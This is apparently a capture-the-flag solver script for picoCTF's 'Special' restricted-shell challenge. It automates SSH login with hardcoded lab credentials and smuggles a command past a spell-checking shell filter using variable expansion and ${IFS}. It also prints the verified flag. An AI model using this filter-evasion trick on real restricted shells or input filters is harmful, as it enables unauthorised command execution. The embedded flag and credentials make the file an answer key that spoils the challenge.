#!/usr/bin/env python3
"""Solver for Challenge 377 Special (picoCTF 2023, General Skills).

SSH lab runs /usr/local/Special.py: every input word is spell-checked
(first letter capitalized, unknown words mangled), e.g. `ls` becomes `Ls`.
Bypass: put the whole command in the FIRST word (no literal spaces) using
shell variable expansion + ${IFS} as separator:

    L=ls;C=-la;$L${IFS}$C${IFS}/home/ctf-player

The first word is never spell-checked, so after $L/$C/${IFS} expansion
sh receives the real command. Recon found flag.txt in ~/blargh/:

    C=cat;F=/home/ctf-player/blargh/flag.txt;$C${IFS}$F

Usage: solve_377_special.py [host] [port] [password]
Verified: academy{5p311ch3ck_15_7h3_w0r57_9fd4af4a}
  (POST /api/submissions/ -> correct:true)
"""
import pty
import os
import re
import select
import sys
import time

HOST = "xebec.cylabacademy.net"
PORT = 37508
PASSWORD = "8d1db23b"
USER = "ctf-player"
FLAG_RE = re.compile(r"academy\{[^}]*\}|picoCTF\{[^}]*\}")

CMDS = ["C=cat;F=/home/ctf-player/blargh/flag.txt;$C${IFS}$F", "exit"]


def solve(host=HOST, port=PORT, password=PASSWORD, cmds=CMDS):
    pid, fd = pty.fork()
    if pid == 0:
        os.execvp("ssh", ["ssh", "-p", str(port),
                          "-o", "StrictHostKeyChecking=no",
                          "-o", "ConnectTimeout=15",
                          "%s@%s" % (USER, host)])
        os._exit(1)
    out = b""
    ci = 0
    pw_sent = False
    deadline = time.time() + 120
    while time.time() < deadline:
        r, _, _ = select.select([fd], [], [], 2)
        if r:
            try:
                ch = os.read(fd, 4096)
            except OSError:
                break
            if not ch:
                break
            out += ch
        txt = out.decode(errors="replace")
        if not pw_sent and "password" in txt.lower():
            os.write(fd, (password + "\n").encode())
            pw_sent = True
        if pw_sent and "Special$" in txt:
            prompts = txt.count("Special$")
            if ci < len(cmds) and prompts > ci:
                os.write(fd, (cmds[ci] + "\n").encode())
                ci += 1
                time.sleep(1)
            if ci >= len(cmds) and prompts > ci:
                break
    txt = out.decode(errors="replace")
    m = FLAG_RE.search(txt)
    if not m:
        raise RuntimeError("flag not found: " + txt[-500:])
    return m.group(0)


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    pw = sys.argv[3] if len(sys.argv) > 3 else PASSWORD
    print(solve(host, port, pw))
